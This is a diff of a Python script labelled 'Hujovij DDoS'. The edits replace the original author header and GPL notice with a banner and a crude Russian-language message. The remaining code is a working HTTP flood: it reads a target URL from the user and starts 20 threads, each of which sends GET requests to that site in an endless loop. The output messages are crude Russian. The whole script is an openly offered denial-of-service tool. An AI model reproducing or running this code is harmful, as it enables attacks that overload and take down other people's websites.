@@ -1,24 +1,27 @@
 #!/usr/bin/python
 #coding=utf-8
 
-__AUTHOR__	= "CAMEL"
-__DATE__	= "16/01/20"
-__VERSION__	= "0.1"
-__GITHUB__	= "https://github.com/unknown"
 
-'''Agradecimento especial ao Maximoz e BernardoGO'''
 
+
+banner = """
+ ____________________________________________________
+|                                                    |
+| [--] Name: Hujovij DDoS                            |
+|                                                    |
+| [--] Created by: CamelStyle                        |
+|                                                    |
+| [--] GitHub:  https://github.com/CamelStyle        |
+|                                                    |
+| [--] Version: 0.2                                  |
+|____________________________________________________|
 """
-    Copyright (C) 2015  Franco Colombino
-    This program is free software; you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation; either version 2 of the License, or
-    (at your option) any later version.
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-"""
+print (banner)
+
+
+
+print("Copyright (С) 2020 Изерская Народная Республика \n Кароч, я не буду вот это вот сейчас рассказывать об авторских правах и все такое, \n ибо не вижу смысла - всё равно этот скрипт (дай б-г) пойдет по рукам и кругу. \n поэтому, если работает - заебца, нет - помоги исправить ошибки :3 \n приятного 'ознакомления'")
+
 
 
 import threading
@@ -28,9 +31,9 @@ def dos(target):
     while True:
         try:
             res = requests.get(target)
-            print(colorama.Fore.YELLOW + "Хуйню отослал!" + colorama.Fore.WHITE)
+            print("Хуйню отослал!")
         except requests.exceptions.ConnectionError:
-            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Ошибка соединения!")
+            print("Ошибка соединения!")
 threads = 20
 
 url = input("ДАВАЙ САЙТ СЮДА: ")
@@ -53,5 +56,3 @@ for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(url,))
     thr.start()
     print(str(i + 1) + " ПОТОКИ ХУЯРЯТСЯ, МОЛОДЕЦ!")
-
-    
